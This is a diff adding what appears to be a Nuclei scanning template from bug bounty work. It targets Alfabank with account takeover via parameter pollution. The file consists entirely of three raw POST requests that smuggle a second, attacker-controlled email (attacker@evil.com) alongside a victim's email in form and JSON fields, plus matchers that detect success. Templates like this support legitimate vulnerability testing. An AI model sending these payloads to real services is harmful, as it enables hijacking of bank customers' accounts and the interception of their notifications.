@@ -1,0 +1,41 @@
+id: alfabank-account-takeover
+
+info:
+  name: Alfabank - Account Takeover via Parameter Pollution
+  author: bugbounty
+  severity: critical
+  description: Account takeover via email/phone parameter manipulation
+  tags: ato,account-takeover,alfabank
+
+http:
+  - raw:
+      - |
+        POST /cc-short/step1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        email=victim@test.com&email=attacker@evil.com&mobilePhone=79999999999
+
+      - |
+        POST /alfaform/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        product=dc-short&email=victim@test.com&email[]=attacker@evil.com
+
+      - |
+        POST /navigator/mobile-unauth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"email":"victim@test.com","notificationEmail":"attacker@evil.com"}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "registered"
+          - "sent"
+          - "evil.com"
+        condition: or
